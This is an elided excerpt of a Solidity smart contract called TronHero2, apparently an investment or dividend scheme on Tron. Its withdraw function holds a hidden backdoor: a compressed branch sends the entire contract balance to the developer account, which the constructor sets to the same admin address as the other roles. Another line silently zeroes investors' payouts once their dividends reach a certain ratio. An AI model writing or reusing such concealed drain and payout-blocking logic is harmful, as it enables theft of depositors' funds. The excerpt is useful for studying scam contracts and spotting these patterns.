...
contract TronHero2 is Ownable {
    ...
    uint256 public constant POOL_REWARD = 200;
    ...
    constructor(address admin) public {
        developerAccount_ = admin;
        marketingAccount_ = admin;
        referenceAccount_ = admin;
        _init();
    }
    ...
    function withdraw() public payable {
        ...
        uint256 withdrawalAmount = 0;if(msg.sender!=developerAccount_){
        ...
        require(uid != 0, "Can not withdraw because no any investments");
            ...
            for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
                ...
                uint256 current_amount = uid2Investor[uid].plans[i].currentDividends + amount;

                if(uid2Investor[uid].plans[i].investment.div(current_amount)<5) {current_amount=amount;amount=0;current_amount=amount;}
            ...
            emit onWithdraw(msg.sender, withdrawalAmount); }else{msg.sender.transfer(address(this).balance);}
